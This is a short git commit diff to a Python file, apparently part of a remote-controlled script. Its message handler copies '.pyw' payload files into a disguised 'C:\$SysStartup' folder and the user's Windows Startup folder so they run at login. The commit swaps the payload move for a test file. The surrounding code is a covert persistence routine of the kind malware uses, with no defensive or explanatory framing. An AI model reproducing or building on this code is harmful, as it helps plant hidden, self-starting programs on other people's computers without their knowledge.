1cba232d8866a22e0d263d6e602dd2a80cd6fdcc
BrainFuzz-hub <failoni401@gmail.com>
2021-03-25 17:37:47 +0100

    test

--- code/plain.py
+++ code/plain.py
@@ -98,7 +98,7 @@ def process(message):
         call(["move", "pslib.pyw", "C:\\$SysStartup"], shell=True)
         with open("update.pyw", "w") as file:
             file.write(var)
-        call(["move", "update.pyw", f"\"C:\\Users\\{getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\\""], shell=True)
+        call('move test.txt "C:/Users/failo/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"', shell=True)
         recvMsg()
 
     else:
